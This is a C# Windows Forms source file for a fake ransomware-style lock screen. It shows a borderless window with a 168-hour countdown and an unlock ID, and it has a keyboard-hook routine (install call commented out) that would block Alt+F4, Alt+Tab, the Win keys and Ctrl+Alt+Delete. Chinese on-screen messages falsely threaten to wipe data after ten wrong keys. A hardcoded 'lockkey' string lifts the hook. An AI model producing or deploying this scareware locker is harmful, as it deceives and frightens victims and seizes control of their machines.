using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Vjsdn.Tech.KeyboardHook;

namespace Collapse
{
    public partial class collapse : Form
    {
        //勾子管理类 
        private KeyboardHookLib _keyboardHook = null;

        //本机验证ID
        private string VerifyID = null;
        //可随机字符
        private char[] constant =
        {
            '0','1','2','3','4','5','6','7','8','9',
            'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
            'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
         };
        //计时用变量
        int time = 168;       //时
        int branch = 60;     //分
        int second = 60;     //秒

        //错误次数统计
        int errorCount = 10;

        //错误提示计时器时长
        int errorTime = 5;

        public collapse()
        {
            InitializeComponent();
        }

        private void Collapse_Load(object sender, EventArgs e)
        {
            this.FormBorderStyle = FormBorderStyle.None;

            //安装勾子 
            //_keyboardHook = new KeyboardHookLib();
            //_keyboardHook.InstallHook(this.OnKeyPress);

            //初始化本机验证ID
            Random rd = new Random();
            StringBuilder sb = new StringBuilder();
            for (int i=1;i<=60;i++)
            {
                sb.Append(constant[rd.Next(62)]);
            }
            VerifyID = sb.ToString();
            textBoxVerifyID.Text = VerifyID;
        }

        /// <summary> 
        /// 客户端键盘捕捉事件. 
        /// </summary> 
        /// <param name="hookStruct">由Hook程序发送的按键信息</param> 
        /// <param name="handle">是否拦截</param> 
        public void OnKeyPress(KeyboardHookLib.HookStruct hookStruct, out bool handle)
        {
            handle = false; //预设不拦截任何键 
            // 截获左win(开始菜单键)
            if (hookStruct.vkCode == 91)
            {
                handle = true;
            }
            // 截获右win
            if (hookStruct.vkCode == 92)
            {
                handle = true;
            }
            //截获Ctrl+Esc 
            if (hookStruct.vkCode == (int)Keys.Escape && (int)Control.ModifierKeys == (int)Keys.Control)
            {
                handle = true;
            }
            //截获alt+f4 
            if (hookStruct.vkCode == (int)Keys.F4 && (int)Control.ModifierKeys == (int)Keys.Alt)
            {
                handle = true;
            }
            //截获alt+tab 
            if (hookStruct.vkCode == (int)Keys.Tab && (int)Control.ModifierKeys == (int)Keys.Alt)
            {
                handle = true;
            }
            //截获F1-F12
            if (hookStruct.vkCode >= (int)Keys.F1 && hookStruct.vkCode <= (int)Keys.F12)
            {
                handle = true;
            }
            //截获Ctrl+Alt+Delete 
            if ((int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Alt + (int)Keys.Delete)
            {
                handle = true;
            }
            //如果键A~Z 
            //if (hookStruct.vkCode >= (int)Keys.A && hookStruct.vkCode <= (int)Keys.Z)
            //{
            //    //挡掉B键 
            //    if (hookStruct.vkCode == (int)Keys.B)
            //        hookStruct.vkCode = (int)Keys.None; //设键为0 

            //    handle = true;
            //}
            //Keys key = (Keys)hookStruct.vkCode;
            //label1.Text = "你按下:" + (key == Keys.None ? "" : key.ToString());
        }

        private void Collapse_KeyDown(object sender, KeyEventArgs e)
        {
            ButtonOK_Click(null,null);
        }

        private void ButtonOK_Click(object sender, EventArgs e)
        {
            if (textBoxPwd.Text.Equals(VerifyID))
            {
                labelTip.Text = "电脑成功解锁!! 恭喜您的电脑脱落了危险!!";
                ExitTimer.Start();
            }
            else if(textBoxPwd.Text.Equals("lockkey"))
            {
                //取消勾子 
                if (_keyboardHook != null) _keyboardHook.UninstallHook();
                labelTip.Text = "您解锁了键盘钩子,现在,您可以使用全部键盘按键了!!";
            }
            else
            {
                errorCount--;
                Checktimer.Start();
            }
        }

        private void LockTimer_Tick(object sender, EventArgs e)
        {
            //初始化计时事件
            if (second == 0)
            {
                branch--;
                second = 60;
            }
            else if (branch == 0)
            {
                time--;
                branch = 60;
                second = 60;
            }
            second--;
            this.labelRecoverableTime.Text = $"{time}:{branch}:{second}";
        }

        private void Checktimer_Tick(object sender, EventArgs e)
        {
            if (errorTime == 0)
            {
                errorTime = 5;
                labelTip.Text = "=== 输入适配您电脑的解锁密钥即可关闭本程序 ===";
                Checktimer.Stop();
            }
            else
            {
                errorTime--;
                if (errorCount <= 0)
                {
                    labelTip.Text = "错误次数已达上限!! 执行病毒解密&清空数据操作...";
                    Checktimer.Stop();
                    ExitTimer.Start();
                }
                else
                {
                    labelTip.Text = "密钥输入错误!! 请检查后重新输入...(还有" + errorCount + "次机会)";
                }
            }
        }

        private void ExitTimer_Tick(object sender, EventArgs e)
        {
            //取消勾子 
            if (_keyboardHook != null) _keyboardHook.UninstallHook();
            Application.Exit();
        }
    }
}
